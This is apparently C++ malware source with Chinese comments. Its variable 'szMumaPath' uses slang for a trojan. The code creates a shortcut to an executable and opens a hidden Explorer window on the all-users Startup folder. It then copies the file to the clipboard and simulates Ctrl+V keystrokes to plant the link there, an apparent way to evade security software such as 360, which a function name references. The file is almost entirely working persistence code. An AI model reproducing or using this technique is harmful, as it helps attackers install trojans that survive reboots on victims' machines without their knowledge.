#include "stdafx.h"
#include "windows.h"
#include "TCHAR.h"
#include "Tlhelp32.h"
#include "commctrl.h"
#include "shlwapi.h"
#include <Shlobj.h>
#include "objidl.h "

#include "Iphlpapi.h"
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"Ws2_32.lib")
#pragma comment(lib,"shlwapi.lib")

//HWND hStartWnd;

// TCHAR szExeName[MAX_PATH];
//  
// TCHAR szStartLink[MAX_PATH];

//extern const IID  IID_IPersistFile;

//获取FolderView窗口

typedef struct EMNUARGS 
{
	TCHAR *szWndClassName;
	TCHAR *szWndText;
	HWND  hWnd;
	DWORD dwWndProcessID;
	//	HWND  hChildWnd;
}EMNUARGS,*pEMNUARGS;

EMNUARGS EmnuArgs;


BOOL CALLBACK GetWndByWndArgs(HWND hWnd, LPARAM lParam)
{
	DWORD dwProcessId = 0;
	TCHAR szDesWndText[MAX_PATH]={0};
	//TCHAR szSrcWndText[MAX_PATH]={0};
	TCHAR szDesWndClassName[MAX_PATH]={0};
	//TCHAR szSrcWndClassName[MAX_PATH]={0};

	GetWindowThreadProcessId(hWnd, &dwProcessId);

	pEMNUARGS pEmnuArgs=(pEMNUARGS)lParam;

	if (pEmnuArgs->dwWndProcessID&&dwProcessId!=pEmnuArgs->dwWndProcessID)
	{
		return TRUE;
	}

	GetWindowText(hWnd,szDesWndText,MAX_PATH);
	GetClassName(hWnd,szDesWndClassName,MAX_PATH);


	if (pEmnuArgs->szWndText)
	{
		if(!_tcsicmp(szDesWndText,pEmnuArgs->szWndText))	pEmnuArgs->hWnd=hWnd;
		else pEmnuArgs->hWnd=0;
	}

	if (pEmnuArgs->szWndClassName)
	{
		if(!_tcsicmp(szDesWndClassName,pEmnuArgs->szWndClassName))	pEmnuArgs->hWnd=hWnd;	
		else pEmnuArgs->hWnd=0;
	}

	//找到句柄后停止枚举
	if (pEmnuArgs->hWnd)
	{
		return FALSE;
	}
	return TRUE;
}

//模拟双击程序
BOOL Exlplorer_Select(TCHAR *szRunExePath,WORD wShow)
{


	PROCESS_INFORMATION ProcessInformation={0};

	STARTUPINFO StartupInfo={0};

	//_tmemset(&StartupInfo,0,sizeof(STARTUPINFO));
	StartupInfo.cb=sizeof(StartupInfo);
	StartupInfo.dwFlags =STARTF_USESHOWWINDOW;
	StartupInfo.wShowWindow =wShow;


	int  dwNum = 0;

	TCHAR* szTempBuf[MAX_PATH*2]={0};

	_tcsncpy((TCHAR*)szTempBuf,(TCHAR*)szRunExePath,MAX_PATH*2);

	for (dwNum=0;dwNum<10;dwNum++)
	{
		if (CreateProcess(0,(LPTSTR)szTempBuf, 0, 0, 0, 0, 0, 0, &StartupInfo,&ProcessInformation))
		{
			//Sleep(1000);
			return TRUE;
		}
	}
	return FALSE;

}


void HideWnd(HWND hWnd)
{
	DWORD dwExStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
	dwExStyle|=WS_EX_LEFTSCROLLBAR;

	for (int i=0;i<=100;i++)
	{
		SetWindowLong(hWnd,WS_EX_LEFTSCROLLBAR,dwExStyle);
		SetWindowPos(hWnd,0, 0, 0, 0, 0, SWP_HIDEWINDOW|SWP_NOSIZE|SWP_NOMOVE|SWP_NOZORDER);
		ShowWindow(hWnd,0);
	}
}



HWND CreateWndProcess(TCHAR *szFileName)
{

	HWND hWnd=0;
	WORD wShowWindow=0;

	TCHAR szCmd[MAX_PATH];
	//wsprintf(szCmd,"explorer.exe /select, %s",szFileName);

	wsprintf(szCmd,"explorer.exe %s\\",szFileName);


	if (!Exlplorer_Select(szCmd,0)){
		return hWnd;
	}

	TCHAR szFilePath[MAX_PATH];
	StrCpyA(szFilePath,(LPCTSTR)szFileName);

	////*(StrRChr(szFilePath,NULL,'\\'))=0;///

	TCHAR szShort[MAX_PATH];

	StrCpyA(szShort,StrRChr(szFilePath,NULL,'\\')+1);

	while(wShowWindow<=1000)
	{
		memset(&EmnuArgs,0,sizeof(EmnuArgs));

		EmnuArgs.szWndText=szFilePath;

		EnumWindows(GetWndByWndArgs,(LPARAM)(&EmnuArgs));

		if (!EmnuArgs.hWnd)
		{

			memset(&EmnuArgs,0,sizeof(EmnuArgs));
			EmnuArgs.szWndText=szShort;
			EnumWindows(GetWndByWndArgs,(LPARAM)(&EmnuArgs));
			if (EmnuArgs.hWnd){
				break;
			}
		}
		else break;
		Sleep(10);
	}

	if (!EmnuArgs.hWnd)
	{
		return hWnd;
	}

// 	HWND hParentWnd=EmnuArgs.hWnd;
// 	memset(&EmnuArgs,0,sizeof(EmnuArgs));
// 
// 	EmnuArgs.szWndText=TEXT("FolderView");
// 	EmnuArgs.szWndClassName=TEXT("SysListView32");
// 
// 	EnumChildWindows(hParentWnd,GetWndByWndArgs,(LPARAM)(&EmnuArgs));

	//hSysListViewWnd=EmnuArgs.hWnd;



	return EmnuArgs.hWnd;
}



VOID CutOrCopyFiles(char *lpBuffer,UINT uBufLen,BOOL bCopy)
{
	UINT uDropEffect;
	DROPFILES dropFiles;
	UINT uGblLen,uDropFilesLen;
	HGLOBAL hGblFiles,hGblEffect;
	char *szData,*szFileList;

	DWORD *dwDropEffect;

	uDropEffect=RegisterClipboardFormat("Preferred DropEffect");
	hGblEffect=GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE,sizeof(DWORD));
	dwDropEffect=(DWORD*)GlobalLock(hGblEffect);
	if(bCopy)
		*dwDropEffect=DROPEFFECT_COPY;
	else 
		*dwDropEffect=DROPEFFECT_MOVE;
	GlobalUnlock(hGblEffect);

	uDropFilesLen=sizeof(DROPFILES);
	dropFiles.pFiles =uDropFilesLen;
	dropFiles.pt.x=0;
	dropFiles.pt.y=0;
	dropFiles.fNC =FALSE;
	dropFiles.fWide =TRUE;

	uGblLen=uDropFilesLen+uBufLen*2+8;
	hGblFiles= GlobalAlloc(GMEM_ZEROINIT|GMEM_MOVEABLE|GMEM_DDESHARE, uGblLen);
	szData=(char*)GlobalLock(hGblFiles);
	memcpy(szData,(LPVOID)(&dropFiles),uDropFilesLen);
	szFileList=szData+uDropFilesLen;

	MultiByteToWideChar(CP_ACP,MB_COMPOSITE,
		lpBuffer,uBufLen,(WCHAR *)szFileList,uBufLen);

	GlobalUnlock(hGblFiles);

	if( OpenClipboard(NULL) )
	{
		EmptyClipboard();
		SetClipboardData( CF_HDROP, hGblFiles );
		SetClipboardData(uDropEffect,hGblEffect);
		CloseClipboard();
	}
}

BOOL ClipboardRW(TCHAR *szFileName,DWORD dwFlags)
{

	if (dwFlags)
	{

		CutOrCopyFiles(szFileName,strlen(szFileName)+1,1);

	}



	return TRUE;
}



BOOL Loader(TCHAR *szMumaPath)
{

	//  	__try
	//  	{

	TCHAR szSystemDir[MAX_PATH];
	// 
	//c:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\";

	SHGetSpecialFolderPath(NULL,szSystemDir,CSIDL_COMMON_STARTUP,0);

	TCHAR szStartLink[MAX_PATH]={0};

	wsprintf(szStartLink,"%s%s",szSystemDir,StrRChr(szMumaPath,0,'\\'));


	if (PathFileExists(szStartLink))
	{
		return TRUE;
	}


	HWND hWnd=CreateWndProcess(szSystemDir);


	//StrCpyA(szStartLink,szSystemDir);
	//StrCatA(szSystemDir,StrRChr(szMumaPath,0,'\\'));

	//ClipboardRW(szMumaPath,1);


	//HWND hWnd=hStartWnd;

	//OutputDebugStringA(szStartLink);


	while(!PathFileExists(szStartLink))
	{
		ClipboardRW(szMumaPath,1);

		SetForegroundWindow(hWnd);
		SetActiveWindow(hWnd);

		keybd_event(VK_CONTROL,0,0,0);
		keybd_event(0x56,0,0,0);
		keybd_event(0x56,0,KEYEVENTF_KEYUP,0);
		keybd_event(VK_CONTROL,0,KEYEVENTF_KEYUP,0);
		Sleep(1000*10);
	}

	SendMessage(hWnd,WM_CLOSE,0,0);
// 
//  	}
// 
// 	_except(EXCEPTION_EXECUTE_HANDLER)
// 	{
// 		return 1;
// 	}
	return 0;

}

HRESULT CreateShortcut(LPCSTR pszPathObj,LPSTR pszParam,LPSTR pszPath,LPSTR pszPathLink,LPSTR pszDesc)
{
	HRESULT hres; //调用 COM 接口方法之后的返回值
	IShellLink *pShellLink;
	IPersistFile *pPersistFile;
	WCHAR wsz[MAX_PATH]; //UNICODE串, 用来存放快捷方式文件名

	CoInitialize(NULL); //初始化 COM 库
	//创建 COM 对象并获取其实现的接口
	hres = CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,IID_IShellLink,(void **)&pShellLink);
	if(FAILED(hres))
	{
		pShellLink ->Release(); //释放 IShellLink 接口
		CoUninitialize(); //关闭 COM 库, 释放所有 COM 资源
		return FALSE;
	}
	//设置快捷方式的各种属性
	pShellLink->SetPath(pszPathObj); //快捷方式所指的应用程序名
	pShellLink->SetArguments(pszParam); //参数
	pShellLink->SetDescription(pszDesc); //描述
	pShellLink->SetWorkingDirectory(pszPath); //设置工作目录
	//pShellLink->SetIconLocation("C:\\Icon.ico",0); //快捷方式的图标
	//pShellLink->SetHotkey(热键); //启动快捷方式的热键(只能是Ctrl+Alt+_)
	//pShellLink->SetShowCmd(SW_MAXIMIZE); //运行方式(常规窗口,最大化,最小化)
	//查询 IShellLink 接口从而得到 IPersistFile 接口来保存快捷方式
	hres = pShellLink->QueryInterface(IID_IPersistFile,(void **)&pPersistFile);
	if(FAILED(hres))
	{
		pPersistFile ->Release(); //释放 IPersistFile 接口
		pShellLink ->Release(); //释放 IShellLink 接口
		CoUninitialize(); //关闭 COM 库, 释放所有 COM 资源
		return(FALSE);
	}
	//转换 ANSI 串为 UNICODE 串(COM 内部使用 NUICODE)
	MultiByteToWideChar(CP_ACP, 0, pszPathLink, -1, wsz, MAX_PATH);
	//使用 IPersistFile 接口的 Save() 方法保存快捷方式
	hres = pPersistFile ->Save(wsz, TRUE);

	//释放 IPersistFile 接口
	pPersistFile ->Release();
	//释放 IShellLink 接口
	pShellLink ->Release();
	//关闭 COM 库, 释放所有 COM 资源
	CoUninitialize();
	return(hres);
}



LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	CHAR szWindowsPath[MAX_PATH] = {0};

	switch (message)
	{
	case WM_CREATE:
		SetProcessShutdownParameters(0,SHUTDOWN_NORETRY+0x4fe);
		//		SetTimer(hWnd,5000,0,0);
		break;
	case  WM_TIMER:
		//		OutputDebugStringA("ddddddd");
		//SetProcessShutdownParameters(0,SHUTDOWN_NORETRY);
		break;

	case WM_DESTROY:
		//	::ExitProcess(0);
		break;
	case WM_QUERYENDSESSION:

		//		Loader(szExeName);

		return TRUE;

	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}

	return 0;
}

BOOL WINAPI Wait360Exit()
{

	WNDCLASSEXA wcex = {0};
	wcex.cbSize			= sizeof(WNDCLASSEX);
	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.hInstance		= (HINSTANCE)GetModuleHandleA;
	wcex.hIcon			= ::LoadIcon( NULL, IDI_WINLOGO );
	wcex.hCursor		= ::LoadCursor( NULL, IDC_ARROW );
	wcex.hbrBackground	= (HBRUSH)COLOR_WINDOW;
	wcex.lpszClassName	= "sfdfds";

	::RegisterClassExA(&wcex);

	HWND g_hWndMain = ::CreateWindowA(wcex.lpszClassName, "", WS_OVERLAPPEDWINDOW, 0, 0, 100, 100, NULL, NULL, wcex.hInstance, NULL);
	if (NULL != g_hWndMain)
	{
		::ShowWindow(g_hWndMain, SW_HIDE);
		::UpdateWindow(g_hWndMain);


		MSG msg;
		while (::GetMessage(&msg, NULL, 0, 0)) 
		{
			::TranslateMessage(&msg);
			::DispatchMessage(&msg);
		}
	}

	return TRUE;
}


void  MoveLinkToStartup(char *szSrcExeName)
{


	//TCHAR szSystemDir[MAX_PATH];

	//c:\\Documents and Settings\\All Users\\「开始」菜单\\程序\\启动\\";

	TCHAR szLink[MAX_PATH];
	StrCpyA(szLink,szSrcExeName);

	*(StrRChr(szLink,0,'.'))=0;

	StrCatA(szLink,".lnk");

	//wsprintf(szLink,"%s")


	CreateShortcut(szSrcExeName,0,0,szLink,0);

	//StrCatA(szExeName,szLink);

// 	SHGetSpecialFolderPath(NULL,szSystemDir,CSIDL_COMMON_STARTUP,0);
// 	StrCatA(szSystemDir,"\\");

	//TCHAR sztemp[MAX_PATH]={0};
	//StrCpyA(szStartLink,szSystemDir);
// 	StrCatA(szSystemDir,StrRChr(szLink,0,'\\'));
// 
// 	CopyFile(szLink,szSystemDir,FALSE);



// 
// 	DeleteFile(szStartLink);		
	
	//hStartWnd=CreateWndProcess(szSystemDir);

	Loader(szLink);



	//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Wait360Exit,0, 0, NULL);

	return ;
}

